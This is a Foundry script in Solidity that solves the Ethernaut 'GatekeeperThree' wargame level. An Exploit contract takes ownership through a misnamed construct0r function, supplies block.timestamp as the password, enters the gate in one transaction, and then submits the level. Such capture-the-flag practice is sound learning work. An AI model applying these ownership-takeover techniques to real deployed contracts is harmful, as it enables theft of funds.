// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import {GatekeeperThree} from "../../src/28/GatekeeperThree.sol";
import {GatekeeperThreeFactory} from "src/28/GatekeeperThreeFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {HelperConfig} from "../HelperConfig.s.sol";

contract GatekeeperThreeExploit is Script {
    address public levelFactory;
    HelperConfig public config;

    function run() external {
        if (block.chainid == 11155111) {
            levelFactory = vm.envAddress("LEVEL28_SEPOLIA_ADDRESS");
        } else {
            levelFactory = address(new GatekeeperThreeFactory());
        }
        // Deploy a new instance using the level Address
        config = new HelperConfig(levelFactory);
        (address ethernaut, address payable instance, uint256 deployerKey) = config.activeNetworkConfig();

        vm.startBroadcast(deployerKey);

        GatekeeperThree instanceContract = GatekeeperThree(instance);
        Exploit exploit = new Exploit(instanceContract);

        (bool success,) = instance.call{value: 0.0015 ether}("");
        require(success);
        // Do everything in oen tx to make block.timestamp the same value between trick creation and getAllowance call. 
        // @note Also if the exploit is done is many tx, it can revert because of some simulation issues EVEN when using vm.load. 
        exploit.setAllThreeGatesAndEnter();

        // DONE !

        // Submit results
        Ethernaut(ethernaut).submitLevelInstance(instance);
        (,, bool completed) = Ethernaut(ethernaut).emittedInstances(instance);
        require(completed == true, "Solution is not solving the level");

        vm.stopBroadcast();
    }
}

contract Exploit {
    GatekeeperThree instanceContract;

    constructor(GatekeeperThree _instanceContract){
        instanceContract = _instanceContract;
    }

    function setAllThreeGatesAndEnter() external {
        instanceContract.construct0r();
        instanceContract.createTrick();
        instanceContract.getAllowance(block.timestamp);
        instanceContract.enter();
    }
}
